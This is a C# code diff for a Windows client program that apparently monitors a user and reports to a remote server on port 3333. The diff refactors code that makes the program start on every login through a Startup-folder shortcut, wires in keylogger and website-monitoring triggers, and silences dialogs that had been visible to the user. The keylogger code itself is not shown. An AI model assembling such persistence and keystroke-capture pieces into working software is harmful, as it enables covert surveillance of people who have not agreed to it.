@@ -33,19 +33,12 @@ namespace ClientSide
         {
             RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
 
-           // if (rkApp.GetValue("ClientSide.exe") == null) { }
-                // Remove the value from the registry so that the application doesn't start
-              //  else 
-              //  rkApp.DeleteValue("ClientSide.exe", false);
-             string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
-             WshShell shell = new WshShell();
-             string shortcutAddress = startupFolder + @"\MyStartupShortcut.lnk";
-             IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(shortcutAddress);
-             shortcut.Description = "A startup shortcut. If you delete this shortcut from your computer, LaunchOnStartup.exe will not launch on Windows Startup"; // set the description of the shortcut
-             shortcut.WorkingDirectory = Application.StartupPath; /* working directory */
-             shortcut.TargetPath = Application.ExecutablePath; /* path of the executable */
-            shortcut.Save(); // save the shortcut 
-             shortcut.Arguments = "/a /c";
+            // if (rkApp.GetValue("ClientSide.exe") == null) { }
+            // Remove the value from the registry so that the application doesn't start
+            //  else 
+            //  rkApp.DeleteValue("ClientSide.exe", false);
+            connectAtReStartComputer();
+
             Program p = new Program();
             //Application.EnableVisualStyles();
             //Application.SetCompatibleTextRenderingDefault(false);
@@ -61,7 +54,20 @@ namespace ClientSide
             Application.Run();
         }
 
-      
+        private static void connectAtReStartComputer()
+        {
+            string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
+            WshShell shell = new WshShell();
+            string shortcutAddress = startupFolder + @"\MyStartupShortcut.lnk";
+            IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(shortcutAddress);
+            shortcut.Description = "A startup shortcut. If you delete this shortcut from your computer, LaunchOnStartup.exe will not launch on Windows Startup"; // set the description of the shortcut
+            shortcut.WorkingDirectory = Application.StartupPath; /* working directory */
+            shortcut.TargetPath = Application.ExecutablePath; /* path of the executable */
+            shortcut.Save(); // save the shortcut 
+            shortcut.Arguments = "/a /c";
+        }
+
+
 
         // The function is activated as soon as data is received in the socket
         private void ReceiveCallback(IAsyncResult AR)
@@ -89,7 +95,7 @@ namespace ClientSide
 
                 }
                 else {
-                    ShowErrorDialog("Server send:\n" + data);
+                    //ShowErrorDialog("Server send:\n" + data);
                 }
                 //System.Threading.Thread.Sleep(7000);
                 //SendData("server send: \n" + data);
@@ -119,9 +125,24 @@ namespace ClientSide
             if (dbs == null) {
                 dbs = new DBclient(name);
             }
+
+            // here will play all triggers:
+
+            // KeyLogger
             KeyLogger k = new KeyLogger(dbs, set);
-            
-            //here will play all triggers;
+
+            // Site
+            MonitorSite monitorSite = new MonitorSite(dbs, set);
+
+            // files
+
+            // installations 
+
+            // Report
+
+
+
+
         }
        
         // Defines functions for sending and receiving data through the socket
@@ -189,6 +210,8 @@ namespace ClientSide
                 ip = clientForm.ip;
 
                 dbs = new DBclient(name);
+                // 
+
 
                 // Create new socket 
                 clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
@@ -221,7 +244,7 @@ namespace ClientSide
             filepath = Path.Combine(paths);
             string set = "";
             DirectoryInfo d = new DirectoryInfo(filepath);//Assuming Test is your Folder
-            ShowErrorDialog("filepath is: \n" + filepath);
+            //ShowErrorDialog("filepath is: \n" + filepath);
             if (!Directory.Exists(filepath))
             {
                 return false;
@@ -234,7 +257,7 @@ namespace ClientSide
 
                 if (file.Name != null)
                 {
-                    ShowErrorDialog(file.Name);
+                    //ShowErrorDialog(file.Name);
                     // Open the file to read from.
                     using (StreamReader sr = System.IO.File.OpenText(Path.Combine(filepath, file.Name)))
                     {
@@ -250,7 +273,7 @@ namespace ClientSide
                         }
                     }
                     
-                    playMonitor("set"+set);
+                    playMonitor(set); 
                     reConnect();
                     return true;
 
@@ -288,7 +311,8 @@ namespace ClientSide
             }
         }
 
-        public void reConnect() {
+        public void reConnect() { 
+
 
             try {
                 // Create new socket 
@@ -299,8 +323,8 @@ namespace ClientSide
                 IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(ip), 3333);
                 // The function ConnectCallback set callback to receive and send 
                 clientSocket.BeginConnect(endPoint, ConnectCallback, clientSocket);
-            }
-            catch (SocketException ex)
+            } 
+            catch (SocketException ex) 
             {
                 ShowErrorDialog("reConnect send SocketException\r\n" + ex.Message);
                  
@@ -310,6 +334,6 @@ namespace ClientSide
                 ShowErrorDialog("reConnect send ObjectDisposedException \r\n" + ex.Message);
             }
         }
-       
+     
     }
 }
